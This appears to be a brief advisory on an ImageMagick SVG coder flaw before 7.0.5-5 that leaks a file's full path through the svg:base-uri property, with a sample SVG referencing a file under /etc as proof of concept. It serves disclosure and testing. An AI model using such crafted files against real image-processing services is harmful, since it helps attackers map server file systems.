# ImageMagick info disclosure SVG coder
Vulnerable code ImageMagick before 7.0.5-5 https://github.com/ImageMagick/ImageMagick/commit/cab049cec5034813efc221425aff2ce6a6bcb896
SVG coder set property `svg:base-uri` with detalied information about source file full path.
This vulnerability was not fixed at 6 version of ImageMagick
## Sample file
```xml
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" 
  "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg width="1337px" height="1337px" version="1.1"
     xmlns="http://www.w3.org/2000/svg" xmlns:xlink= "http://www.w3.org/1999/xlink">
	<image xlink:href="/etc/favicon.png" x="0" y="0" height="1337px" width="1337px"/>
</svg>
```
## Severity: Minor
Full path disclosure at image meta-data
